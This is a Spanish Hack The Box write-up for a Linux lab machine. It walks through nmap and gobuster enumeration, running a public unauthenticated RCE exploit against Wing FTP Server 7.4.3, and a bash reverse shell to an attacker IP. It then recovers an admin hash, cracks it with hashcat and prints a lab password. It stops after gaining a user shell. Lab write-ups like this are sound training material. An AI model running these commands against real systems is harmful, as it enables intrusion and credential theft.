# 🗂️ Writeup HTB —

> [!info] 📋 Información de la Máquina
> **🖥️ OS:** Linux
> **🎯 IP:** 10.129.14.117
> **💀 Dificultad:**
> **🌐 Plataforma:** Hack The Box

---

## 🔍 Reconocimiento y Enumeración

Antes de comenzar con la enumeración activa, lanzamos un ping para verificar conectividad con la máquina objetivo. El valor del **TTL** nos permite intuir el sistema operativo: un TTL cercano a **128** indica Windows, mientras que uno cercano a **64** apunta a Linux.

> [!tip] Verificación de conectividad y detección de OS por TTL
> ```bash
> ping -c 1 10.129.14.117
> ```
> `-c 1` — Envía **un único paquete ICMP** y termina, en lugar de pingear indefinidamente.
> `10.129.14.117` — **IP objetivo** a la que se lanza el ping.

![](assets/WingData-img-05-04-2026-1.png)

Obtenemos respuesta con un TTL de **63**, lo que confirma que estamos ante una máquina **Linux**. Confirmada la conectividad, procedemos con la enumeración de puertos.

---

### 👁️ Enumeración con Nmap

#### 🔎 Enumeración de puertos

Comenzamos identificando qué puertos se encuentran abiertos sobre el rango completo de los 65535 posibles mediante un SYN Scan, que envía paquetes SYN sin completar el three-way handshake TCP — más rápido y menos ruidoso que un TCP Connect Scan completo.

> [!tip] Escaneo de puertos completo y sigiloso
> ```bash
> nmap -sS -p- --open --min-rate 5000 -n -Pn 10.129.14.117 -vvv -oN ports
> ```
> `-sS` — **SYN Scan** (half-open). Envía SYN, recibe SYN-ACK si el puerto está abierto o RST si está cerrado, sin completar nunca el handshake. Requiere privilegios de root.
> `-p-` — Escanea los **65535 puertos** posibles, desde el 1 hasta el 65535.
> `--open` — Muestra **únicamente los puertos abiertos**, filtrando los cerrados y filtrados.
> `--min-rate 5000` — Fuerza un mínimo de **5000 paquetes por segundo** para acelerar el escaneo.
> `-n` — Sin resolución DNS — evita latencia adicional y ruido en la red.
> `-Pn` — Sin ping previo — asume el host activo aunque ICMP esté bloqueado.
> `10.129.14.117` — **IP objetivo** del escaneo.
> `-vvv` — **Triple verbose** — muestra los puertos abiertos en tiempo real sin esperar al final.
> `-oN ports` — Guarda el output en formato legible en el archivo `ports`.

![](assets/WingData-img-05-04-2026-2.png)

El escaneo revela **dos puertos abiertos**: `22` (SSH) y `80` (HTTP).

---

#### 🔬 Enumeración de versiones y servicios

Con los puertos identificados, lanzamos un segundo escaneo apuntando únicamente a los puertos `22` y `80` para determinar qué servicios y versiones exactas corren en cada uno, ejecutando los scripts NSE por defecto para obtener información adicional.

> [!tip] Detección de versiones y scripts sobre puertos seleccionados
> ```bash
> nmap -sC -sV -p22,80 --min-rate 5000 -n -Pn -vvv 10.129.14.117 -oN version
> ```
> `-sC` — Lanza los **scripts por defecto** del motor NSE (Nmap Scripting Engine). Incluye detección de banners, enumeración básica de servicios y comprobaciones de configuraciones inseguras.
> `-sV` — **Detección de versiones** — envía probes adicionales para identificar el software exacto y su versión en cada puerto.
> `-p22,80` — Escanea **únicamente los puertos 22 y 80**, los descubiertos en el paso anterior.
> `--min-rate 5000` — Mínimo de **5000 paquetes por segundo**.
> `-n` — Sin resolución DNS.
> `-Pn` — Sin ping previo.
> `-vvv` — **Triple verbose**.
> `10.129.14.117` — **IP objetivo**.
> `-oN version` — Guarda el output en el archivo `version`.

![](assets/WingData-img-05-04-2026-3.png)

---
Veemos que se estña intenteando conectar al dominio wingdata.htb por lo que tenemos un virtuak hosting qye debemos añadir a nuestro archivo etc hosts.
Si accedemis a la web vemos lo siguiente
![](assets/WingData-img-05-04-2026-4.png)

Vemos un client portal a la derecha del meny que nos redirige al subdominio ftp.wingdata.htb por lo que debemos añdirlo al etc hotsts quedando asi la linea: 10.129.14.117   ftp.wingdata.htb wingdata.htb
Al acceder vemos lo siguiente
![](assets/WingData-img-05-04-2026-7.png)

Este subdominio corre l servicio de wing ftp adfemas mostrando la version 7.4.3. Con esta info podemos apsar a la fase de explotacion



#### 🌐 Fuzzing Web — Puerto 80

Con el puerto 80 activo, procedemos a realizar fuzzing de directorios y archivos para mapear la superficie web expuesta. El objetivo es descubrir rutas ocultas, paneles de administración, archivos de configuración o cualquier recurso no enlazado directamente desde la página principal. Lanzamos gobuster con una wordlist de tamaño medio y un conjunto amplio de extensiones para maximizar la cobertura:

> [!tip] Fuzzing de directorios y archivos sobre el puerto 80
> ```bash
> gobuster dir -u http://10.129.14.117 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --no-error -x php,htm,html,csv,txt,xml --add-slash -t 40 -o fuzzing
> ```
> `dir` — Modo de fuerza bruta de directorios y archivos en un servidor web.
> `-u http://10.129.14.117` — URL objetivo del escaneo.
> `-w .../DirBuster-2007_directory-list-2.3-medium.txt` — Wordlist en su variante medium para una búsqueda exhaustiva sin ser excesivamente lenta.
> `--no-error` — No muestra errores en el output, manteniendo la salida limpia.
> `-x php,htm,html,csv,txt,xml` — Añade extensiones de archivo a cada entrada de la wordlist, ampliando la superficie de búsqueda más allá de los directorios puros.
> `--add-slash` — Añade una barra final a cada petición, útil para forzar la detección de directorios que requieren trailing slash.
> `-t 40` — Lanza **40 hilos en paralelo** para acelerar el escaneo.

---

## 💥 Explotación
---
En el subdomiio hemos descubierto que la web corre el servicio de wing ftp con la version 7.4.3.
Cuando tenemos la version de un servicio podemos intentar nbuscarla en internet, y damos con la siguiente pagina de github https://github.com/estebanzarate/CVE-2025-47812-Wing-FTP-Server-7.4.3-Unauthenticated-RCE-PoC
Procedemos a clonar el repositorio y creamos el entorno virtual de python que nos pide. luego solo queda ejecutar el script de python pasandole la url del subdominio con el siguiente comando:
python3 exploit.py -u http://ftp.wingdata.htb

Ahora tenemos acceso a una shell interactiva

![](assets/WingData-img-06-04-2026.png)


## 🔼 Escalada de Privilegios
---
Para escalar privilegios primero vamos a mandar una reverse shell a nuestra maquina kali. para ello vamos a ingreasr el siguiente comando despues de habernos puesto en esuccha en nuestro kali por el puerto 443: bash -c 'sh -i >%26 /dev/tcp/10.10.16.8/443 0>%261'

![](assets/WingData-img-06-04-2026-3.png)

Hacemos tratamiento de la tty y comenzamos:
![](assets/WingData-img-06-04-2026-4.png)

Listando directorios llegamos a la siguiente ruta: ls -la ./Data/\_ADMINISTRATOR/ que contiene los archivos admins.xml y settings.xml. si abrimos el de admins cemos que nos proporcuiona un usuario y ciontraseña de la cuenta admin del server ftp, siendo admin:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba

![](assets/WingData-img-06-04-2026-5.png)

Haciendo una busqueda en internet vemos que el formato del hash de la contraseña es password encriptada sha256  + :WingFTP

![](assets/WingData-img-07-04-2026-1.png)

Guardamos la password en un archivo de texto y lo crkackeamos con hashcat con el siguiente coimando: hashcat wacky_pass.txt /usr/share/wordlists/rockyou.txt -m 1410

![](assets/WingData-img-07-04-2026-2.png)

Obtenemos la contraseña del usuario wacky, por lo que accedemos con el comando su wacky y la contraseña !#7Blushing^\*Bride5

![](assets/WingData-img-07-04-2026-3.png)

Ya somos el usuario wacky y podemos leer la flag en el directorio home. Ahora toca seguir hasta root.









## 📝 Lecciones Aprendidas